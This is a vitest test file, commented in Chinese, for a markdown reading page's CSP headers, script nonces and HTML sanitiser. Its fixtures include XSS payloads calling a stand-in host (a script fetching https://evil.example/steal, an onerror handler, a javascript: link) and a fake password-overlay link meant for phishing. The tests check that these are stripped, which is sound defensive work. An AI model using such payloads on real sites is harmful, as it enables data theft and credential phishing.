import { describe, it, expect } from "vitest";
import { rawHtmlHeaders, shellHeaders, withNonce, nonce } from "../src/headers";
import { renderMarkdown } from "../src/render";
import { readingPage } from "../src/html";

const csp = (h: HeadersInit) => (h as Record<string, string>)["Content-Security-Policy"];

describe("shellHeaders(第一方外壳的真 CSP)", () => {
  const h = shellHeaders("N0NCE");
  it("默认全关,脚本只认本次 nonce", () => {
    expect(csp(h)).toContain("default-src 'none'");
    expect(csp(h)).toContain("script-src 'nonce-N0NCE'");
    expect(csp(h)).not.toContain("script-src 'unsafe-inline'");
  });
  it("connect-src / base-uri 关死,frame-ancestors 保留", () => {
    expect(csp(h)).toContain("connect-src 'none'");
    expect(csp(h)).toContain("base-uri 'none'");
    expect(csp(h)).toContain("frame-ancestors 'none'");
  });
  it("img-src 放行 https:(2026-07-28 决策:外链图片照常显示)", () => {
    expect(csp(h)).toContain("img-src 'self' https: data:");
  });
  it("密码页要能 POST 回自己", () => {
    expect(csp(h)).toContain("form-action 'self'");
  });
});

describe("rawHtmlHeaders(HTML 稿:这轮不动)", () => {
  it("只禁嵌套,保「原样能跑」", () => {
    expect(csp(rawHtmlHeaders())).toBe("frame-ancestors 'none';");
  });
});

describe("withNonce", () => {
  it("每个 <script> 都打上 nonce,闭合标签不动", () => {
    expect(withNonce("<script>a</script><script >b</script>", "X")).toBe(
      '<script nonce="X">a</script><script nonce="X" >b</script>',
    );
  });
  it("nonce 每次响应不同", () => {
    expect(nonce()).not.toBe(nonce());
  });
});

describe("阅读页整页:注入的脚本进不来,外壳自己的脚本仍可执行", () => {
  const evil = [
    "# 标题",
    "",
    '<script src="https://evil.example/x.js"></script>',
    "",
    "<script>fetch('https://evil.example/steal')</script>",
    "",
    '<img src="https://evil.example/pixel.png" onerror="alert(1)">',
    "",
    "[点我](javascript:alert(1))",
    "",
    "## 二级\n\n## 三级\n\n### 四级",
  ].join("\n");

  const { html: article, toc } = renderMarkdown(evil);
  const n = "TESTNONCE";
  const page = withNonce(readingPage({ title: "T", articleHtml: article, toc }), n);

  it("正文里没有任何 <script> 标签", () => {
    expect(article).not.toContain("<script");
    expect(article).not.toContain("evil.example/x.js");
    expect(article).not.toContain("evil.example/steal");
  });
  it("整页里每个 <script> 都带 nonce(没有裸脚本能被 CSP 放过)", () => {
    const total = page.match(/<script(?=[\s>])/gi) ?? [];
    const nonced = page.match(new RegExp(`<script nonce="${n}"`, "gi")) ?? [];
    expect(total.length).toBeGreaterThan(0);
    expect(nonced.length).toBe(total.length);
  });
  it("onerror 被剥掉,javascript: 链接只留文字", () => {
    expect(article).not.toContain("onerror");
    expect(article).not.toContain("javascript:");
    expect(article).toContain("点我");
  });
  it("外链图片本身保留(决策:img-src 放行 https:)", () => {
    expect(article).toContain('<img src="https://evil.example/pixel.png"');
  });
});

describe("整页:正文撞不到外壳的 CSS/结构(CSP 管不到的那一类攻击)", () => {
  // 外壳 CSS 里 .lb / .side / .progress / .pill 都是 position:fixed + 极高 z-index,
  // 正文一旦能自带 class 就能盖满全屏做钓鱼点击层 —— CSP 不拦导航,只能在净化层拦。
  const md = [
    '<a class="lb open" href="https://evil.example/login">重新输入密码</a>',
    "",
    '<div class="side">假左栏</div>',
    "",
    '<div class="progress"><i></i></div>',
    "",
    '<div id="hspace-nav-host">抢宿主</div>',
  ].join("\n");
  const { html: article, toc } = renderMarkdown(md);
  const page = readingPage({ title: "T", articleHtml: article, toc });

  it("正文不含任何 class", () => {
    expect(article).not.toContain("class=");
  });
  it("外壳自己的固定定位元素只有一份(没有被正文伪造出第二份)", () => {
    for (const cls of ['class="lb', 'class="side"', 'class="progress"', 'class="pill"']) {
      expect(page.split(cls).length - 1).toBeLessThanOrEqual(1);
    }
  });
  it("正文抢不到悬浮导航的宿主 id", () => {
    expect(page.split('id="hspace-nav-host"').length - 1).toBe(1);
    expect(article).not.toContain("hspace-nav-host");
  });
  it("链接文字仍在(只去外壳样式,不吞内容)", () => {
    expect(article).toContain("重新输入密码");
    expect(article).toContain("假左栏");
    expect(article).toContain("抢宿主");
  });
});
